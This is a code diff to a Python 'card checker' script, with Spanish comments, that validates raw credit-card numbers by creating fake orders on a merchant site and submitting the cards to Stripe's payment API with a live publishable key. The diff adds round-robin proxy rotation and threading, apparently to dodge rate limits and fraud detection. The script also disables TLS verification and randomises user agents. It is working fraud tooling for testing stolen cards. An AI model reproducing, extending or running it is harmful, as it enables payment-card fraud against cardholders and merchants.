@@ -3,6 +3,7 @@ import time
 import json
 import uuid
 import random
+import threading
 import requests
 import urllib3
 from urllib.parse import urlparse, parse_qs, unquote
@@ -22,6 +23,25 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
 ]
+
+PROXY_LIST = []
+PROXY_LOCK = threading.Lock()
+
+
+def set_proxies(proxy_urls: list):
+    """Establecer lista de proxies, formato: ['http://ip:port', 'socks5://ip:port', ...]"""
+    global PROXY_LIST
+    PROXY_LIST = [p.strip() for p in proxy_urls if p.strip()]
+
+
+def get_next_proxy():
+    """Obtener siguiente proxy (rotación round-robin)"""
+    if not PROXY_LIST:
+        return None
+    with PROXY_LOCK:
+        proxy = PROXY_LIST.pop(0)
+        PROXY_LIST.append(proxy)
+    return proxy
 
 
 def parse_card(raw):
@@ -94,7 +114,7 @@ def create_order(s, name, email, whatsapp):
     return order if order["txid"] else None
 
 
-def stripe_create_payment_method(cc, ua, client_session_id):
+def stripe_create_payment_method(cc, ua, client_session_id, proxies=None):
     try:
         r = requests.post(
             "https://api.stripe.com/v1/payment_methods",
@@ -128,7 +148,7 @@ def stripe_create_payment_method(cc, ua, client_session_id):
                 "key": "pk_live_51RSTezAt7mRmYVFHoWvWCGFLvK9uLfsYJoyVgndvnD5LOKROJ1hRq7xwUA433ooF11UTlSc4VrcBzWHBTLcZYwaT00q3dtVysu",
                 "_stripe_version": "2026-03-25.dahlia",
             },
-            timeout=30, verify=False,
+            timeout=30, verify=False, proxies=proxies,
         )
     except requests.RequestException:
         return None
@@ -162,7 +182,7 @@ def process_stripe_payment(s, order, pm_id):
             },
             timeout=60,
         )
-    except requests.RequestException as e:
+    except requests.RequestException:
         return None
 
 
@@ -189,7 +209,7 @@ def parse_response(text):
     return ("info", str(j)[:300])
 
 
-def run_check(cc):
+def run_check(cc, proxies=None):
     ua = random.choice(USER_AGENTS)
     client_session_id = str(uuid.uuid4())
     name, email, whatsapp = gen_buyer()
@@ -203,12 +223,14 @@ def run_check(cc):
         "Upgrade-Insecure-Requests": "1",
     })
     s.verify = False
+    if proxies:
+        s.proxies.update(proxies)
 
     order = create_order(s, name, email, whatsapp)
     if not order:
         return ("Declined", "no se pudo crear pedido")
 
-    pm_id = stripe_create_payment_method(cc, ua, client_session_id)
+    pm_id = stripe_create_payment_method(cc, ua, client_session_id, proxies)
     if not pm_id:
         return ("Declined", "Stripe rechazó la tarjeta (BIN NOT SUPPORTED)")
 
@@ -221,3 +243,9 @@ def run_check(cc):
         return ("Declined", "sin mensaje")
     status = "Approved" if tipo == "success" else "Declined"
     return (status, msg)
+
+
+def run_check_with_proxy(cc):
+    proxy = get_next_proxy()
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    return run_check(cc, proxies=proxies)
